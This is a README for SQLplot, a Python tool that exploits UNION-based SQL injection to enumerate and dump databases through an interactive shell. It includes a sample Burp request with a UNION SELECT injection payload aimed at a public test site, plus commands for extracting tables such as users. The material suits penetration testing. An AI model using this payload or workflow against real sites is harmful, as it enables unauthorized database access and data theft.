# SQLplot

## Description
SQLplot is a Python project designed to exploit UNION-based SQL injection (SQLi) vulnerabilities for further exploitation. It requires a packet file with a Burp Suite request formatted as follows:

```
GET /artists.php?artist=99%20UNION%20SELECT%201,2,(PAYLOAD)-- HTTP/1.1
Host: testphp.vulnweb.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

## Features

### Database Caching
- `refresh records`: Retrieves records of a selected table and stores in cache.
- `refresh database`: Retrieves records from all tables within selected database and stores in cache.

### Main Function
- Supports interactive SQL shell for database interaction.
- Provides commands for managing databases and tables (e.g., `use <database>`, `use table <table>`, `show databases`, `show tables`, `select <query>`).

## Usage

### Command-Line Arguments
- `-r, --request-file`: File containing Burp request (required).
- `-p, --position`: Payload position in request file (default=PAYLOAD).
- `-q, --query`: SQL payload (query to be executed) (default=DATABASE()).
- `-db, --database`: Set database name.
- `-tb, --table`: Set table name.
- `--sql-shell`: Start a friendly interactive SQL prompt.

### Example
To execute a SQL query using a Burp request file:
```bash
python3 sqlplot.py -r request.txt -p "QUERY_POSITION" -q "SELECT * FROM users"
```

To start an interactive SQL shell:
```bash
python3 sqlplot.py -r request.txt --sql-shell
```

### Interactive SQL Shell Commands
- `use <database>`: Select a database.
- `use table <table>`: Select a table.
- `show databases`: Show all databases.
- `show tables`: Show all tables in the selected database.
- `show records <limit>`: Show records from the selected table.
- `select <query>`: Execute a SELECT query.
- `refresh records`: Refresh records of the selected table.
- `refresh database`: Refresh the selected database.
- `clear`: Clear the screen.
- `exit`: Exit the SQL shell.

## Requirements
- Python 3.x

## Installation
Clone the repository and install the required dependencies:
```bash
git clone https://github.com/hb7736/SQLplot.git
cd SQLplot
pip install -r requirements.txt
```

